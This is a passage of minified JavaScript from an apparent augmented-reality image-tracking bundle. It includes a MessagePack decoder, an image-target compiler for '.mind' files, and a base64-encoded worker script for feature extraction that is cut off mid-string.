        return t ? t.call(n) : (n = "function" == typeof __values ? __values(n) : n[Symbol.iterator](),
        e = {},
        s("next"),
        s("throw"),
        s("return"),
        e[Symbol.asyncIterator] = function() {
            return this
        }
        ,
        e);
        function s(r) {
            e[r] = n[r] && function(i) {
                return new Promise((function(a, c) {
                    (function o(r, i, a, c) {
                        Promise.resolve(c).then((function(l) {
                            r({
                                value: l,
                                done: a
                            })
                        }
                        ), i)
                    }
                    )(a, c, (i = n[r](i)).done, i.value)
                }
                ))
            }
        }
    }
      , wr = function(n) {
        return this instanceof wr ? (this.v = n,
        this) : new wr(n)
    }
      , k_ = function(n, t, e) {
        if (!Symbol.asyncIterator)
            throw new TypeError("Symbol.asyncIterator is not defined.");
        var o, s = e.apply(n, t || []), r = [];
        return o = {},
        i("next"),
        i("throw"),
        i("return"),
        o[Symbol.asyncIterator] = function() {
            return this
        }
        ,
        o;
        function i(h) {
            s[h] && (o[h] = function(p) {
                return new Promise((function(f, m) {
                    r.push([h, p, f, m]) > 1 || a(h, p)
                }
                ))
            }
            )
        }
        function a(h, p) {
            try {
                !function c(h) {
                    h.value instanceof wr ? Promise.resolve(h.value.v).then(l, u) : d(r[0][2], h)
                }(s[h](p))
            } catch (f) {
                d(r[0][3], f)
            }
        }
        function l(h) {
            a("next", h)
        }
        function u(h) {
            a("throw", h)
        }
        function d(h, p) {
            h(p),
            r.shift(),
            r.length && a(r[0][0], r[0][1])
        }
    }
      , T_ = function(n) {
        var t = typeof n;
        return "string" === t || "number" === t
    }
      , sf = new DataView(new ArrayBuffer(0))
      , N_ = new Uint8Array(sf.buffer)
      , of = function() {
        try {
            sf.getInt8(0)
        } catch (n) {
            return n.constructor
        }
        throw new Error("never reached")
    }()
      , AI = new of("Insufficient data")
      , R_ = new v_
      , $_ = function() {
        function n(t, e, s, o, r, i, a, c) {
            void 0 === t && (t = zI.defaultCodec),
            void 0 === e && (e = void 0),
            void 0 === s && (s = Go),
            void 0 === o && (o = Go),
            void 0 === r && (r = Go),
            void 0 === i && (i = Go),
            void 0 === a && (a = Go),
            void 0 === c && (c = R_),
            this.extensionCodec = t,
            this.context = e,
            this.maxStrLength = s,
            this.maxBinLength = o,
            this.maxArrayLength = r,
            this.maxMapLength = i,
            this.maxExtLength = a,
            this.keyDecoder = c,
            this.totalPos = 0,
            this.pos = 0,
            this.view = sf,
            this.bytes = N_,
            this.headByte = -1,
            this.stack = []
        }
        return n.prototype.reinitializeState = function() {
            this.totalPos = 0,
            this.headByte = -1,
            this.stack.length = 0
        }
        ,
        n.prototype.setBuffer = function(t) {
            this.bytes = Ol(t),
            this.view = function m_(n) {
                if (n instanceof ArrayBuffer)
                    return new DataView(n);
                var t = Ol(n);
                return new DataView(t.buffer,t.byteOffset,t.byteLength)
            }(this.bytes),
            this.pos = 0
        }
        ,
        n.prototype.appendBuffer = function(t) {
            if (-1 !== this.headByte || this.hasRemaining(1)) {
                var e = this.bytes.subarray(this.pos)
                  , s = Ol(t)
                  , o = new Uint8Array(e.length + s.length);
                o.set(e),
                o.set(s, e.length),
                this.setBuffer(o)
            } else
                this.setBuffer(t)
        }
        ,
        n.prototype.hasRemaining = function(t) {
            return this.view.byteLength - this.pos >= t
        }
        ,
        n.prototype.createExtraByteError = function(t) {
            var s = this.view
              , o = this.pos;
            return new RangeError("Extra ".concat(s.byteLength - o, " of ").concat(s.byteLength, " byte(s) found at buffer[").concat(t, "]"))
        }
        ,
        n.prototype.decode = function(t) {
            this.reinitializeState(),
            this.setBuffer(t);
            var e = this.doDecodeSync();
            if (this.hasRemaining(1))
                throw this.createExtraByteError(this.pos);
            return e
        }
        ,
        n.prototype.decodeMulti = function(t) {
            return nf(this, (function(e) {
                switch (e.label) {
                case 0:
                    this.reinitializeState(),
                    this.setBuffer(t),
                    e.label = 1;
                case 1:
                    return this.hasRemaining(1) ? [4, this.doDecodeSync()] : [3, 3];
                case 2:
                    return e.sent(),
                    [3, 1];
                case 3:
                    return [2]
                }
            }
            ))
        }
        ,
        n.prototype.decodeAsync = function(t) {
            var e, s, o, r;
            return S_(this, void 0, void 0, (function() {
                var i, a, c, l, u, d, h, p;
                return nf(this, (function(f) {
                    switch (f.label) {
                    case 0:
                        i = !1,
                        f.label = 1;
                    case 1:
                        f.trys.push([1, 6, 7, 12]),
                        e = XI(t),
                        f.label = 2;
                    case 2:
                        return [4, e.next()];
                    case 3:
                        if ((s = f.sent()).done)
                            return [3, 5];
                        if (c = s.value,
                        i)
                            throw this.createExtraByteError(this.totalPos);
                        this.appendBuffer(c);
                        try {
                            a = this.doDecodeSync(),
                            i = !0
                        } catch (m) {
                            if (!(m instanceof of))
                                throw m
                        }
                        this.totalPos += this.pos,
                        f.label = 4;
                    case 4:
                        return [3, 2];
                    case 5:
                        return [3, 12];
                    case 6:
                        return l = f.sent(),
                        o = {
                            error: l
                        },
                        [3, 12];
                    case 7:
                        return f.trys.push([7, , 10, 11]),
                        s && !s.done && (r = e.return) ? [4, r.call(e)] : [3, 9];
                    case 8:
                        f.sent(),
                        f.label = 9;
                    case 9:
                        return [3, 11];
                    case 10:
                        if (o)
                            throw o.error;
                        return [7];
                    case 11:
                        return [7];
                    case 12:
                        if (i) {
                            if (this.hasRemaining(1))
                                throw this.createExtraByteError(this.totalPos);
                            return [2, a]
                        }
                        throw d = (u = this).headByte,
                        h = u.pos,
                        p = u.totalPos,
                        new RangeError("Insufficient data in parsing ".concat(ef(d), " at ").concat(p, " (").concat(h, " in the current buffer)"))
                    }
                }
                ))
            }
            ))
        }
        ,
        n.prototype.decodeArrayStream = function(t) {
            return this.decodeMultiAsync(t, !0)
        }
        ,
        n.prototype.decodeStream = function(t) {
            return this.decodeMultiAsync(t, !1)
        }
        ,
        n.prototype.decodeMultiAsync = function(t, e) {
            return k_(this, arguments, (function() {
                var o, r, i, a, c, l, u, d, h;
                return nf(this, (function(p) {
                    switch (p.label) {
                    case 0:
                        o = e,
                        r = -1,
                        p.label = 1;
                    case 1:
                        p.trys.push([1, 13, 14, 19]),
                        i = XI(t),
                        p.label = 2;
                    case 2:
                        return [4, wr(i.next())];
                    case 3:
                        if ((a = p.sent()).done)
                            return [3, 12];
                        if (c = a.value,
                        e && 0 === r)
                            throw this.createExtraByteError(this.totalPos);
                        this.appendBuffer(c),
                        o && (r = this.readArraySize(),
                        o = !1,
                        this.complete()),
                        p.label = 4;
                    case 4:
                        p.trys.push([4, 9, , 10]),
                        p.label = 5;
                    case 5:
                        return [4, wr(this.doDecodeSync())];
                    case 6:
                        return [4, p.sent()];
                    case 7:
                        return p.sent(),
                        0 == --r ? [3, 8] : [3, 5];
                    case 8:
                        return [3, 10];
                    case 9:
                        if (!((l = p.sent())instanceof of))
                            throw l;
                        return [3, 10];
                    case 10:
                        this.totalPos += this.pos,
                        p.label = 11;
                    case 11:
                        return [3, 2];
                    case 12:
                        return [3, 19];
                    case 13:
                        return u = p.sent(),
                        d = {
                            error: u
                        },
                        [3, 19];
                    case 14:
                        return p.trys.push([14, , 17, 18]),
                        a && !a.done && (h = i.return) ? [4, wr(h.call(i))] : [3, 16];
                    case 15:
                        p.sent(),
                        p.label = 16;
                    case 16:
                        return [3, 18];
                    case 17:
                        if (d)
                            throw d.error;
                        return [7];
                    case 18:
                        return [7];
                    case 19:
                        return [2]
                    }
                }
                ))
            }
            ))
        }
        ,
        n.prototype.doDecodeSync = function() {
            t: for (; ; ) {
                var t = this.readHeadByte()
                  , e = void 0;
                if (t >= 224)
                    e = t - 256;
                else if (t < 192)
                    if (t < 128)
                        e = t;
                    else if (t < 144) {
                        if (0 !== (s = t - 128)) {
                            this.pushMapState(s),
                            this.complete();
                            continue t
                        }
                        e = {}
                    } else if (t < 160) {
                        if (0 !== (s = t - 144)) {
                            this.pushArrayState(s),
                            this.complete();
                            continue t
                        }
                        e = []
                    } else {
                        var o = t - 160;
                        e = this.decodeUtf8String(o, 0)
                    }
                else if (192 === t)
                    e = null;
                else if (194 === t)
                    e = !1;
                else if (195 === t)
                    e = !0;
                else if (202 === t)
                    e = this.readF32();
                else if (203 === t)
                    e = this.readF64();
                else if (204 === t)
                    e = this.readU8();
                else if (205 === t)
                    e = this.readU16();
                else if (206 === t)
                    e = this.readU32();
                else if (207 === t)
                    e = this.readU64();
                else if (208 === t)
                    e = this.readI8();
                else if (209 === t)
                    e = this.readI16();
                else if (210 === t)
                    e = this.readI32();
                else if (211 === t)
                    e = this.readI64();
                else if (217 === t) {
                    o = this.lookU8();
                    e = this.decodeUtf8String(o, 1)
                } else if (218 === t) {
                    o = this.lookU16();
                    e = this.decodeUtf8String(o, 2)
                } else if (219 === t) {
                    o = this.lookU32();
                    e = this.decodeUtf8String(o, 4)
                } else if (220 === t) {
                    if (0 !== (s = this.readU16())) {
                        this.pushArrayState(s),
                        this.complete();
                        continue t
                    }
                    e = []
                } else if (221 === t) {
                    if (0 !== (s = this.readU32())) {
                        this.pushArrayState(s),
                        this.complete();
                        continue t
                    }
                    e = []
                } else if (222 === t) {
                    if (0 !== (s = this.readU16())) {
                        this.pushMapState(s),
                        this.complete();
                        continue t
                    }
                    e = {}
                } else if (223 === t) {
                    if (0 !== (s = this.readU32())) {
                        this.pushMapState(s),
                        this.complete();
                        continue t
                    }
                    e = {}
                } else if (196 === t) {
                    var s = this.lookU8();
                    e = this.decodeBinary(s, 1)
                } else if (197 === t) {
                    s = this.lookU16();
                    e = this.decodeBinary(s, 2)
                } else if (198 === t) {
                    s = this.lookU32();
                    e = this.decodeBinary(s, 4)
                } else if (212 === t)
                    e = this.decodeExtension(1, 0);
                else if (213 === t)
                    e = this.decodeExtension(2, 0);
                else if (214 === t)
                    e = this.decodeExtension(4, 0);
                else if (215 === t)
                    e = this.decodeExtension(8, 0);
                else if (216 === t)
                    e = this.decodeExtension(16, 0);
                else if (199 === t) {
                    s = this.lookU8();
                    e = this.decodeExtension(s, 1)
                } else if (200 === t) {
                    s = this.lookU16();
                    e = this.decodeExtension(s, 2)
                } else {
                    if (201 !== t)
                        throw new ts("Unrecognized type byte: ".concat(ef(t)));
                    s = this.lookU32();
                    e = this.decodeExtension(s, 4)
                }
                this.complete();
                for (var r = this.stack; r.length > 0; ) {
                    var i = r[r.length - 1];
                    if (0 === i.type) {
                        if (i.array[i.position] = e,
                        i.position++,
                        i.position !== i.size)
                            continue t;
                        r.pop(),
                        e = i.array
                    } else {
                        if (1 === i.type) {
                            if (!T_(e))
                                throw new ts("The type of key must be string or number but " + typeof e);
                            if ("__proto__" === e)
                                throw new ts("The key __proto__ is not allowed");
                            i.key = e,
                            i.type = 2;
                            continue t
                        }
                        if (i.map[i.key] = e,
                        i.readCount++,
                        i.readCount !== i.size) {
                            i.key = null,
                            i.type = 1;
                            continue t
                        }
                        r.pop(),
                        e = i.map
                    }
                }
                return e
            }
        }
        ,
        n.prototype.readHeadByte = function() {
            return -1 === this.headByte && (this.headByte = this.readU8()),
            this.headByte
        }
        ,
        n.prototype.complete = function() {
            this.headByte = -1
        }
        ,
        n.prototype.readArraySize = function() {
            var t = this.readHeadByte();
            switch (t) {
            case 220:
                return this.readU16();
            case 221:
                return this.readU32();
            default:
                if (t < 160)
                    return t - 144;
                throw new ts("Unrecognized array type byte: ".concat(ef(t)))
            }
        }
        ,
        n.prototype.pushMapState = function(t) {
            if (t > this.maxMapLength)
                throw new ts("Max length exceeded: map length (".concat(t, ") > maxMapLengthLength (").concat(this.maxMapLength, ")"));
            this.stack.push({
                type: 1,
                size: t,
                key: null,
                readCount: 0,
                map: {}
            })
        }
        ,
        n.prototype.pushArrayState = function(t) {
            if (t > this.maxArrayLength)
                throw new ts("Max length exceeded: array length (".concat(t, ") > maxArrayLength (").concat(this.maxArrayLength, ")"));
            this.stack.push({
                type: 0,
                size: t,
                array: new Array(t),
                position: 0
            })
        }
        ,
        n.prototype.decodeUtf8String = function(t, e) {
            var s;
            if (t > this.maxStrLength)
                throw new ts("Max length exceeded: UTF-8 byte length (".concat(t, ") > maxStrLength (").concat(this.maxStrLength, ")"));
            if (this.bytes.byteLength < this.pos + e + t)
                throw AI;
            var r, o = this.pos + e;
            return r = this.stateIsMapKey() && null !== (s = this.keyDecoder) && void 0 !== s && s.canBeCached(t) ? this.keyDecoder.decode(this.bytes, o, t) : t > s_ ? function o_(n, t, e) {
                var s = n.subarray(t, t + e);
                return n_.decode(s)
            }(this.bytes, o, t) : FI(this.bytes, o, t),
            this.pos += e + t,
            r
        }
        ,
        n.prototype.stateIsMapKey = function() {
            return this.stack.length > 0 && 1 === this.stack[this.stack.length - 1].type
        }
        ,
        n.prototype.decodeBinary = function(t, e) {
            if (t > this.maxBinLength)
                throw new ts("Max length exceeded: bin length (".concat(t, ") > maxBinLength (").concat(this.maxBinLength, ")"));
            if (!this.hasRemaining(t + e))
                throw AI;
            var s = this.pos + e
              , o = this.bytes.subarray(s, s + t);
            return this.pos += e + t,
            o
        }
        ,
        n.prototype.decodeExtension = function(t, e) {
            if (t > this.maxExtLength)
                throw new ts("Max length exceeded: ext length (".concat(t, ") > maxExtLength (").concat(this.maxExtLength, ")"));
            var s = this.view.getInt8(this.pos + e)
              , o = this.decodeBinary(t, e + 1);
            return this.extensionCodec.decode(o, s, this.context)
        }
        ,
        n.prototype.lookU8 = function() {
            return this.view.getUint8(this.pos)
        }
        ,
        n.prototype.lookU16 = function() {
            return this.view.getUint16(this.pos)
        }
        ,
        n.prototype.lookU32 = function() {
            return this.view.getUint32(this.pos)
        }
        ,
        n.prototype.readU8 = function() {
            var t = this.view.getUint8(this.pos);
            return this.pos++,
            t
        }
        ,
        n.prototype.readI8 = function() {
            var t = this.view.getInt8(this.pos);
            return this.pos++,
            t
        }
        ,
        n.prototype.readU16 = function() {
            var t = this.view.getUint16(this.pos);
            return this.pos += 2,
            t
        }
        ,
        n.prototype.readI16 = function() {
            var t = this.view.getInt16(this.pos);
            return this.pos += 2,
            t
        }
        ,
        n.prototype.readU32 = function() {
            var t = this.view.getUint32(this.pos);
            return this.pos += 4,
            t
        }
        ,
        n.prototype.readI32 = function() {
            var t = this.view.getInt32(this.pos);
            return this.pos += 4,
            t
        }
        ,
        n.prototype.readU64 = function() {
            var t = function Y9(n, t) {
                return 4294967296 * n.getUint32(t) + n.getUint32(t + 4)
            }(this.view, this.pos);
            return this.pos += 8,
            t
        }
        ,
        n.prototype.readI64 = function() {
            var t = MI(this.view, this.pos);
            return this.pos += 8,
            t
        }
        ,
        n.prototype.readF32 = function() {
            var t = this.view.getFloat32(this.pos);
            return this.pos += 4,
            t
        }
        ,
        n.prototype.readF64 = function() {
            var t = this.view.getFloat64(this.pos);
            return this.pos += 8,
            t
        }
        ,
        n
    }()
      , G_ = {};
    class E_ {
        constructor() {
            this.data = null
        }
        compileImageTargets(t, e) {
            return new Promise((async(s,o)=>{
                const r = [];
                for (let l = 0; l < t.length; l++) {
                    const u = t[l]
                      , h = this.createProcessCanvas(u).getContext("2d");
                    h.drawImage(u, 0, 0, u.width, u.height);
                    const p = h.getImageData(0, 0, u.width, u.height)
                      , f = new Uint8Array(u.width * u.height);
                    for (let g = 0; g < f.length; g++) {
                        const b = 4 * g;
                        f[g] = Math.floor((p.data[b] + p.data[b + 1] + p.data[b + 2]) / 3)
                    }
                    const m = {
                        data: f,
                        height: u.height,
                        width: u.width
                    };
                    r.push(m)
                }
                const i = 50 / r.length;
                let a = 0;
                this.data = [];
                for (let l = 0; l < r.length; l++) {
                    const u = r[l]
                      , d = X9(u)
                      , h = i / d.length
                      , p = await D_(d, (()=>{
                        a += h,
                        e(a)
                    }
                    ));
                    this.data.push({
                        targetImage: u,
                        imageList: d,
                        matchingData: p
                    })
                }
                for (let l = 0; l < r.length; l++) {
                    const u = A9(r[l]);
                    this.data[l].trackingImageList = u
                }
                const c = await this.compileTrack({
                    progressCallback: e,
                    targetImages: r,
                    basePercent: 50
                });
                for (let l = 0; l < r.length; l++)
                    this.data[l].trackingData = c[l];
                s(this.data)
            }
            ))
        }
        exportData() {
            const t = [];
            for (let s = 0; s < this.data.length; s++)
                t.push({
                    targetImage: {
                        width: this.data[s].targetImage.width,
                        height: this.data[s].targetImage.height
                    },
                    trackingData: this.data[s].trackingData,
                    matchingData: this.data[s].matchingData
                });
            return function I_(n, t) {
                return void 0 === t && (t = y_),
                new x_(t.extensionCodec,t.context,t.maxDepth,t.initialBufferSize,t.sortKeys,t.forceFloat32,t.ignoreUndefined,t.forceIntegerToFloat).encodeSharedRef(n)
            }({
                v: 2,
                dataList: t
            })
        }
        importData(t) {
            const e = function L_(n, t) {
                return void 0 === t && (t = G_),
                new $_(t.extensionCodec,t.context,t.maxStrLength,t.maxBinLength,t.maxArrayLength,t.maxMapLength,t.maxExtLength).decode(n)
            }(new Uint8Array(t));
            if (!e.v || 2 !== e.v)
                return console.error("Your compiled .mind might be outdated. Please recompile"),
                [];
            const {dataList: s} = e;
            this.data = [];
            for (let o = 0; o < s.length; o++)
                this.data.push({
                    targetImage: s[o].targetImage,
                    trackingData: s[o].trackingData,
                    matchingData: s[o].matchingData
                });
            return this.data
        }
        createProcessCanvas(t) {
            console.warn("missing createProcessCanvas implementation")
        }
        compileTrack({progressCallback: t, targetImages: e, basePercent: s}) {
            console.warn("missing compileTrack implementation")
        }
    }
    const D_ = async(n,t)=>{
        const e = [];
        for (let s = 0; s < n.length; s++) {
            const o = n[s]
              , r = new GI(o.width,o.height);
            await Xc(),
            M((()=>{
                const i = tn(o.data, [o.data.length], "float32").reshape([o.height, o.width])
                  , {featurePoints: a} = r.detect(i)
                  , c = a.filter((h=>h.maxima))
                  , l = a.filter((h=>!h.maxima))
                  , u = EI({
                    points: c
                })
                  , d = EI({
                    points: l
                });
                e.push({
                    maximaPoints: c,
                    minimaPoints: l,
                    maximaPointsCluster: u,
                    minimaPointsCluster: d,
                    width: o.width,
                    height: o.height,
                    scale: o.scale
                }),
                t(s)
            }
            ))
        }
        return e
    }
      , OI = "KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2NsYXNzIHp7Y29uc3RydWN0b3Iocyx0LG8pe3RoaXMuY3Vtc3VtPVtdO2ZvcihsZXQgZT0wO2U8bztlKyspe3RoaXMuY3Vtc3VtLnB1c2goW10pO2ZvcihsZXQgbj0wO248dDtuKyspdGhpcy5jdW1zdW1bZV0ucHVzaCgwKX10aGlzLmN1bXN1bVswXVswXT1zWzBdO2ZvcihsZXQgZT0xO2U8dDtlKyspdGhpcy5jdW1zdW1bMF1bZV09dGhpcy5jdW1zdW1bMF1bZS0xXStzW2VdO2ZvcihsZXQgZT0xO2U8bztlKyspdGhpcy5jdW1zdW1bZV1bMF09dGhpcy5jdW1zdW1bZS0xXVswXStzW2UqdF07Zm9yKGxldCBlPTE7ZTxvO2UrKylmb3IobGV0IG49MTtuPHQ7bisrKXRoaXMuY3Vtc3VtW2VdW25dPXNbZSp0K25dK3RoaXMuY3Vtc3VtW2UtMV1bbl0rdGhpcy5jdW1zdW1bZV1bbi0xXS10aGlzLmN1bXN1bVtlLTFdW24tMV19cXVlcnkocyx0LG8sZSl7bGV0IG49dGhpcy5jdW1zdW1bZV1bb107cmV0dXJuIHQ+MCYmKG4tPXRoaXMuY3Vtc3VtW3QtMV1bb10pLHM+MCYmKG4tPXRoaXMuY3Vtc3VtW2VdW3MtMV0pLHM+MCYmdD4wJiYobis9dGhpcy5jdW1zdW1bdC0xXVtzLTFdKSxufX1jb25zdCBDPTEwLGI9MixNPTYsRj01LEk9Ljk1LEw9LjksTz0uMixaPTgsTj0yNCoyLzMsVT1yPT57Y29uc3R7ZGF0YTpzLHdpZHRoOnQsaGVpZ2h0Om8sc2NhbGU6ZX09cixuPVt0Km9dO2ZvcihsZXQgaT0wO2k8bi5sZW5ndGg7aSsrKW5baV09ITE7Y29uc3QgYT1uZXcgRmxvYXQzMkFycmF5KHMubGVuZ3RoKTtmb3IobGV0IGk9MDtpPHQ7aSsrKWFbaV09LTEsYVt0KihvLTEpK2ldPS0xO2ZvcihsZXQgaT0wO2k8bztpKyspYVtpKnRdPS0xLGFbaSp0K3QtMV09LTE7Zm9yKGxldCBpPTE7aTx0LTE7aSsrKWZvcihsZXQgcD0xO3A8by0xO3ArKyl7bGV0IGY9aSt0KnAsaD0wLGM9MDtmb3IobGV0IHU9LTE7dTw9MTt1KyspaCs9c1tmK3QqdSsxXS1zW2YrdCp1LTFdLGMrPXNbZit0K3VdLXNbZi10K3VdO2gvPTMqMjU2LGMvPTMqMjU2LGFbZl09TWF0aC5zcXJ0KChoKmgrYypjKS8yKX1jb25zdCBnPW5ldyBVaW50MzJBcnJheSgxZTMpO2ZvcihsZXQgaT0wO2k8MWUzO2krKylnW2ldPTA7Y29uc3QgZD1bLTEsMSwtdCx0XTtmb3IobGV0IGk9MTtpPHQtMTtpKyspZm9yKGxldCBwPTE7cDxvLTE7cCsrKXtsZXQgZj1pK3QqcCxoPSEwO2ZvcihsZXQgYz0wO2M8ZC5sZW5ndGg7YysrKWlmKGFbZl08PWFbZitkW2NdXSl7aD0hMTticmVha31pZihoKXtsZXQgYz1NYXRoLmZsb29yKGFbZl0qMWUzKTtjPjk5OSYmKGM9OTk5KSxjPDAmJihjPTApLGdbY10rPTEsbltmXT0hMH19Y29uc3Qgdz0uMDIqdCpvO2xldCBqPTk5OSxFPTA7Zm9yKDtqPj0wJiYoRSs9Z1tqXSwhKEU+dykpOylqLS07Zm9yKGxldCBpPTA7aTxuLmxlbmd0aDtpKyspbltpXSYmYVtpXSoxZTM8aiYmKG5baV09ITEpO2NvbnN0IGw9W107Zm9yKGxldCBpPTA7aTxzLmxlbmd0aDtpKyspbFtpXT1zW2ldKnNbaV07Y29uc3QgUz1uZXcgeihzLHQsbyksRD1uZXcgeihsLHQsbyksaz1uZXcgRmxvYXQzMkFycmF5KHMubGVuZ3RoKTtmb3IobGV0IGk9MDtpPHQ7aSsrKWZvcihsZXQgcD0wO3A8bztwKyspe2NvbnN0IGY9cCp0K2k7aWYoIW5bZl0pe2tbZl09MTtjb250aW51ZX1jb25zdCBoPVAoe2ltYWdlOnIsY3g6aSxjeTpwLHNkVGhyZXNoOkYsaW1hZ2VEYXRhQ3Vtc3VtOlMsaW1hZ2VEYXRhU3FyQ3Vtc3VtOkR9KTtpZihoPT09bnVsbCl7a1tmXT0xO2NvbnRpbnVlfWxldCBjPS0xO2ZvcihsZXQgdT0tQzt1PD1DO3UrKyl7Zm9yKGxldCBtPS1DO208PUM7bSsrKXtpZihtKm0rdSp1PD1iKmIpY29udGludWU7Y29uc3QgeD1SKHtpbWFnZTpyLGN4OmkrbSxjeTpwK3UsdmxlbjpoLHR4OmksdHk6cCxpbWFnZURhdGFDdW1zdW06UyxpbWFnZURhdGFTcXJDdW1zdW06RH0pO2lmKHghPT1udWxsJiZ4PmMmJihjPXgsYz5JKSlicmVha31pZihjPkkpYnJlYWt9a1tmXT1jfXJldHVybiBWKHtpbWFnZTpyLGZlYXR1cmVNYXA6ayx0ZW1wbGF0ZVNpemU6TSxzZWFyY2hTaXplOmIsb2NjU2l6ZTpOLG1heFNpbVRocmVzaDpMLG1pblNpbVRocmVzaDpPLHNkVGhyZXNoOlosaW1hZ2VEYXRhQ3Vtc3VtOlMsaW1hZ2VEYXRhU3FyQ3Vtc3VtOkR9KX0sVj1yPT57bGV0e2ltYWdlOnMsZmVhdHVyZU1hcDp0LHRlbXBsYXRlU2l6ZTpvLHNlYXJjaFNpemU6ZSxvY2NTaXplOm4sbWF4U2ltVGhyZXNoOmEsbWluU2ltVGhyZXNoOmcsc2RUaHJlc2g6ZCxpbWFnZURhdGFDdW1zdW06dyxpbWFnZURhdGFTcXJDdW1zdW06an09cjtjb25zdHtkYXRhOkUsd2lkdGg6bCxoZWlnaHQ6UyxzY2FsZTpEfT1zO249TWF0aC5mbG9vcihNYXRoLm1pbihzLndpZHRoLHMuaGVpZ2h0KS8xMCk7Y29uc3Qgaz0obyoyKzEpKjMsQT1NYXRoLmZsb29yKGwvayksaT1NYXRoLmZsb29yKFMvayk7bGV0IHA9TWF0aC5mbG9vcihsL24pKk1hdGguZmxvb3IoUy9uKStBKmk7Y29uc3QgZj1bXSxoPW5ldyBGbG9hdDMyQXJyYXkoRS5sZW5ndGgpO2ZvcihsZXQgdT0wO3U8aC5sZW5ndGg7dSsrKWhbdV09dFt1XTtsZXQgYz0wO2Zvcig7YzxwOyl7bGV0IHU9YSxtPS0xLHg9LTE7Zm9yKGxldCB5PTA7eTxTO3krKylmb3IobGV0IFQ9MDtUPGw7VCsrKWhbeSpsK1RdPHUmJih1PWhbeSpsK1RdLG09VCx4PXkpO2lmKG09PT0tMSlicmVhaztjb25zdCB2PVAoe2ltYWdlOnMsY3g6bSxjeTp4LHNkVGhyZXNoOjAsaW1hZ2VEYXRhQ3Vtc3VtOncsaW1hZ2VEYXRhU3FyQ3Vtc3VtOmp9KTtpZih2PT09bnVsbCl7aFt4KmwrbV09MTtjb250aW51ZX1pZih2LyhvKjIrMSk8ZCl7aFt4KmwrbV09MTtjb250aW51ZX1sZXQgcT0xLF89LTE7Zm9yKGxldCB5PS1lO3k8PWU7eSsrKXtmb3IobGV0IFQ9LWU7VDw9ZTtUKyspe2lmKFQqVCt5Knk+ZSplfHxUPT09MCYmeT09PTApY29udGludWU7Y29uc3QgSD1SKHtpbWFnZTpzLHZsZW46dixjeDptK1QsY3k6eCt5LHR4Om0sdHk6eCxpbWFnZURhdGFDdW1zdW06dyxpbWFnZURhdGFTcXJDdW1zdW06an0pO2lmKEghPT1udWxsJiYoSDxxJiYocT1ILHE8ZyYmcTx1KXx8SD5fJiYoXz1ILF8+Ljk5KSkpYnJlYWt9aWYocTxnJiZxPHV8fF8+Ljk5KWJyZWFrfWlmKHE8ZyYmcTx1fHxfPi45OSl7aFt4KmwrbV09MTtjb250aW51ZX1mLnB1c2goe3g6bSx5Onh9KSxjKz0xO2ZvcihsZXQgeT0tbjt5PD1uO3krKylmb3IobGV0IFQ9LW47VDw9bjtUKyspeCt5PDB8fHgreT49U3x8bStUPDB8fG0rVD49bHx8KGhbKHgreSkqbCsobStUKV09MSl9cmV0dXJuIGZ9LFA9KHtpbWFnZTpyLGN4OnMsY3k6dCxzZFRocmVzaDpvLGltYWdlRGF0YUN1bXN1bTplLGltYWdlRGF0YVNxckN1bXN1bTpufSk9PntpZihzLU08MHx8cytNPj1yLndpZHRofHx0LU08MHx8dCtNPj1yLmhlaWdodClyZXR1cm4gbnVsbDtjb25zdCBhPTIqTSsxLGc9YSphO2xldCBkPWUucXVlcnkocy1NLHQtTSxzK00sdCtNKTtkLz1nO2xldCB3PW4ucXVlcnkocy1NLHQtTSxzK00sdCtNKTtyZXR1cm4gdy09MipkKmUucXVlcnkocy1NLHQtTSxzK00sdCtNKSx3Kz1nKmQqZCx3L2c8bypvP251bGw6KHc9TWF0aC5zcXJ0KHcpLHcpfSxSPXI9Pntjb25zdHtpbWFnZTpzLGN4OnQsY3k6byx2bGVuOmUsdHg6bix0eTphLGltYWdlRGF0YUN1bXN1bTpnLGltYWdlRGF0YVNxckN1bXN1bTpkfT1yLHtkYXRhOncsd2lkdGg6aixoZWlnaHQ6RX09cyxsPU07aWYodC1sPDB8fHQrbD49anx8by1sPDB8fG8rbD49RSlyZXR1cm4gbnVsbDtjb25zdCBTPTIqbCsxO2xldCBEPWcucXVlcnkodC1sLG8tbCx0K2wsbytsKSxrPWQucXVlcnkodC1sLG8tbCx0K2wsbytsKSxBPTAsaT0oby1sKSpqKyh0LWwpLHA9KGEtbCkqaisobi1sKSxmPWotUztmb3IobGV0IG09MDttPFM7bSsrKXtmb3IobGV0IHg9MDt4PFM7eCsrKUErPXdbaV0qd1twXSxpKz0xLHArPTE7aSs9ZixwKz1mfWxldCBoPWcucXVlcnkobi1sLGEtbCxuK2wsYStsKTtoLz1TKlMsQS09aCpEO2xldCBjPWstRCpELyhTKlMpO3JldHVybiBjPT0wP251bGw6KGM9TWF0aC5zcXJ0KGMpLDEqQS8oZSpjKSl9LFc9KHIscyk9Pntjb25zdCB0PVtdO2ZvcihsZXQgbz0wO288ci5sZW5ndGg7bysrKXtjb25zdCBlPXJbb10sbj1VKGUpLGE9e2RhdGE6ZS5kYXRhLHNjYWxlOmUuc2NhbGUsd2lkdGg6ZS53aWR0aCxoZWlnaHQ6ZS5oZWlnaHQscG9pbnRzOm59O3QucHVzaChhKSxzKG8pfXJldHVybiB0fSxYPSh7aW1hZ2U6cixyYXRpbzpzfSk9Pntjb25zdCB0PU1hdGgucm91bmQoci53aWR0aCpzKSxvPU1hdGgucm91bmQoci5oZWlnaHQqcyksZT1uZXcgVWludDhBcnJheSh0Km8pO2ZvcihsZXQgbj0wO248dDtuKyspe2xldCBhPU1hdGgucm91bmQoMSpuL3MpLGc9TWF0aC5yb3VuZCgxKihuKzEpL3MpLTE7Zz49ci53aWR0aCYmKGc9ci53aWR0aC0xKTtmb3IobGV0IGQ9MDtkPG87ZCsrKXtsZXQgdz1NYXRoLnJvdW5kKDEqZC9zKSxqPU1hdGgucm91bmQoMSooZCsxKS9zKS0xO2o+PXIuaGVpZ2h0JiYoaj1yLmhlaWdodC0xKTtsZXQgRT0wLGw9MDtmb3IobGV0IFM9YTtTPD1nO1MrKylmb3IobGV0IEQ9dztEPD1qO0QrKylFKz0xKnIuZGF0YVtEKnIud2lkdGgrU10sbCs9MTtlW2QqdCtuXT1NYXRoLmZsb29yKEUvbCl9fXJldHVybntkYXRhOmUsd2lkdGg6dCxoZWlnaHQ6b319LFk9cj0+e2NvbnN0IHM9TWF0aC5taW4oci53aWR0aCxyLmhlaWdodCksdD1bXSxvPVtdO3QucHVzaCgyNTYvcyksdC5wdXNoKDEyOC9zKTtmb3IobGV0IGU9MDtlPHQubGVuZ3RoO2UrKylvLnB1c2g